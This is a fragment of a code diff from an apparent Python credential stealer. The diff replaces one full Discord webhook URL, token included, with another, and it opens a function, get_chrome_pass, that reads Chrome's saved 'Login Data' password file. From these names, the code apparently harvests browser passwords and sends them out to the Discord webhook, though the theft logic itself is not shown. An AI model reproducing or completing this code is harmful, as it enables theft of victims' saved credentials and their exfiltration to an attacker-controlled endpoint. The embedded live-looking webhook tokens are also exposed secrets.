@@ -8,7 +8,7 @@ import shutil
 import requests
 
 # Discord webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1329177391569960960/RvhhUXLhcoXBppbx7Qxo7RFu7Avx6x1wh93PFF9fqzZVgOa_42l4c5J1D-_cLFm_P77o"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1333807534510706699/qSTtrWnxvFORjXG80ey3ncpI2VAdI3BcjaSnA_PVF6E4uQqIcwzBpk5JY7TT6Vv8WUoD"
 
 def get_chrome_pass():
     # Path to the Login Data file
